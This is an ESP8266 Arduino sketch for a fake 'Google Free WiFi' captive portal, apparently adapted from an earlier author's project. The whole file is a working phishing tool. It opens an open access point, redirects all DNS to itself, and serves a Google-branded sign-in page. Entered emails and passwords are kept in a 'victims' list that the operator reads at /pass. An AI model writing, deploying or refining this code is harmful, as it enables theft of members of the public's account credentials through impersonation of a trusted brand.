// NodeMcu-ESP8266 Google Fake Wi-Fi Captive Portal
// Based on: Mrwhitehat1 https://github.com/Mrwhitehat1

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "Google Free WiFi"
#define SUBTITLE "Welcome to free wifi service."
#define TITLE "Sign in"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 3 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Captured Credentials"
#define CLEAR_TITLE "Cleared"

// System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1); // Gateway

String victims = ""; // Store captured credentials
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Function to sanitize input to prevent HTML injection
String sanitizeInput(String argName) {
    String input = webServer.arg(argName);
    input.replace("<", "&lt;");
    input.replace(">", "&gt;");
    return input.substring(0, 200); // Limit length
}

// Function to create the page footer
String createFooter() {
    return "<br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
}

// Function to create the page header
String createHeader(String title) {
    String css = "body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Roboto', sans-serif; background-color: #f2f2f2; }"
                 ".login-container { background-color: white; padding: 2em; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); border-radius: 8px; text-align: center; width: 100%; max-width: 400px; }"
                 ".login-container h1 { font-size: 24px; margin: 0 0 20px 0; }"
                 ".login-container input[type=text], .login-container input[type=password] { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }"
                 ".login-container input[type=submit] { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: none; border-radius: 4px; background-color: #4285f4; color: white; font-size: 16px; cursor: pointer; }"
                 ".login-container input[type=submit]:hover { background-color: #357ae8; }"
                 "@media (max-width: 600px) { .login-container { width: 90%; } }"; // Responsive design
    return "<!DOCTYPE html><html><head><title>" + String(SSID_NAME) + " :: " + title + "</title>"
           "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
           "<style>" + css + "</style></head><body><div class='login-container'><h3>Google</h3>";
}

// Function to display captured credentials
String displayCapturedCredentials() {
    return createHeader(PASS_TITLE) + "<ol>" + victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + createFooter();
}

// Function to show the index page
String indexPage() {
    return createHeader(TITLE) + "<form method='POST' action='/post'>"
           "<p>" + BODY + "</p>"
           "<input type='text' name='email' placeholder='Email' required><br>"
           "<input type='password' name='password' placeholder='Enter your password' required><br>"
           "<input type='submit' value='Sign in'></form>" + createFooter() + "</div></body></html>";
}

// Function to handle submitted credentials
String handlePost() {
    String email = sanitizeInput("email");
    String password = sanitizeInput("password");
    victims += "<li>Email: <b>" + email + "</b><br>Password: <b style=color:#ea5455;>" + password + "</b></li>"; // Store captured credentials
    return createHeader(POST_TITLE) + POST_BODY + createFooter();
}

// Function to clear captured credentials
String clearVictims() {
    victims = ""; // Reset the victims list
    return createHeader(CLEAR_TITLE) + "<div><p>The Victims list has been reset.</p></div><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + createFooter();
}

// Function to set up the ESP8266
void setup() {
    Serial.begin(115200); // Initialize serial for debugging
    WiFi.mode(WIFI_AP); // Set WiFi to Access Point mode
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0)); // Configure AP
    WiFi.softAP(SSID_NAME); // Start AP
    dnsServer.start(DNS_PORT, "*", APIP); // Start DNS server
    webServer.on("/post", []() {
        webServer.send(HTTP_CODE, "text/html", handlePost());
    });
    webServer.on("/pass", []() {
        webServer.send(HTTP_CODE, "text/html", displayCapturedCredentials());
    });
    webServer.on("/clear", []() {
        webServer.send(HTTP_CODE, "text/html", clearVictims());
    });
    webServer.onNotFound([]() {
        webServer.send(HTTP_CODE, "text/html", indexPage());
    });
    webServer.begin(); // Start the web server
    Serial.println("Server started");
}

// Main loop to handle client requests
void loop() {
    dnsServer.processNextRequest(); // Handle DNS requests
    webServer.handleClient(); // Handle HTTP requests
}
